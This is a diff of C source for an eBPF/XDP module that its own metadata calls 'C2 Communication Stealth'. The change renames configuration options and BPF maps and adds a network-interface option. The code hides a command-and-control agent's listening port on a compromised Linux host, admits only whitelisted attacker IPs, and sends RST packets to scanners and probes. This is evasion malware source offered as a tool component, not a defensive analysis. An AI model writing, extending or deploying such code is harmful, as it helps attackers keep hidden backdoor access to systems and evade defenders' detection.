@@ -10,11 +10,13 @@ char _metadata[] __attribute__((used, section(".metadata"))) =
       "\"desc\":\"XDP C2 Communication Stealth: Hides Agent listening ports, allows only authorized IP connections, and blocks port scanning/probing.\","
       "\"requires\":[\"is_root\",\"xdp\",\"cap_net_admin\"],"
       "\"options\":{"
-        "\"target\":[\"4444\",\"Agent listening port (the port number to hide)\"]"
+        "\"target_port\":[\"4444\",\"Agent listening port (the port number to hide)\"],"
+        "\"target_ip\":[\"\",\"Authorized IPs allowed to connect (comma/space separated)\"],"
+        "\"iface\":[\"eth0\",\"Network interface to attach XDP to (e.g. eth0, ens33)\"]"
       "},"
       "\"maps\":{"
-        "\"target\":{\"key_size\":2,\"value_size\":4,\"key_type\":\"u16\",\"value_type\":\"u32\"},"
-        "\"whitelist\":{\"key_size\":4,\"value_size\":4,\"key_type\":\"u32\",\"value_type\":\"u32\"}"
+        "\"target_port\":{\"key_size\":2,\"value_size\":4,\"key_type\":\"u16\",\"value_type\":\"u32\"},"
+        "\"target_ip\":{\"key_size\":4,\"value_size\":4,\"key_type\":\"u32\",\"value_type\":\"u32\"}"
       "}"
     "}";
 
@@ -30,7 +32,7 @@ struct {
     __uint(max_entries, 16);
     __type(key, __u16);    /* 端口号（主机字节序） */
     __type(value, __u32);  /* 占位 */
-} target SEC(".maps");
+} target_port SEC(".maps");
 
 /*
  * IP Whitelist for authorized connections (IPv4 addresses in Network Byte Order)
@@ -43,7 +45,7 @@ struct {
     __uint(max_entries, 64);
     __type(key, __u32);    /* IPv4 地址（网络字节序） */
     __type(value, __u32);  /* 占位 */
-} whitelist SEC(".maps");
+} target_ip SEC(".maps");
 
 /* Whitelist lock flag: 0=unlocked (allow all), 1=locked (allow only whitelist) */
 struct {
@@ -51,7 +53,7 @@ struct {
     __uint(max_entries, 1);
     __type(key, __u32);
     __type(value, __u32);
-} whitelist_count SEC(".maps");
+} target_ip_count SEC(".maps");
 
 /* IP Checksum Calculation */
 static __always_inline __u16 csum_fold(__u32 sum) {
@@ -107,7 +109,7 @@ int stealth_link_xdp(struct xdp_md *ctx) {
     __u16 dport = bpf_ntohs(tcp->dest);
 
     /* Non-C2 port, pass through */
-    if (!bpf_map_lookup_elem(&target, &dport))
+    if (!bpf_map_lookup_elem(&target_port, &dport))
         return XDP_PASS;
 
     /* ---- C2 Port Hit ---- */
@@ -124,13 +126,13 @@ int stealth_link_xdp(struct xdp_md *ctx) {
        这里直接查来源 IP，在白名单为空时 lookup 返回 NULL，也就放行。
        一旦白名单非空，只有被加入的 IP 能通过。 */
     /* 若白名单中存在 src_ip 则放行 */
-    if (bpf_map_lookup_elem(&whitelist, &src_ip))
+    if (bpf_map_lookup_elem(&target_ip, &src_ip))
         return XDP_PASS;  /* 在白名单中，放行 */
 
     /* 白名单非空但 src_ip 不在其中 → RST
      * 白名单为空时也走到这里——但需要区分两种情况：
      * 用一个独立的 Array Map（单元素）作为"已锁定"标志 */
-    __u32 *locked = bpf_map_lookup_elem(&whitelist_count, &zero_key);
+    __u32 *locked = bpf_map_lookup_elem(&target_ip_count, &zero_key);
     if (!locked || *locked == 0)
         return XDP_PASS;  /* 尚未锁定，放行所有 */
     /* Locked and not in whitelist → Continue to construct RST */
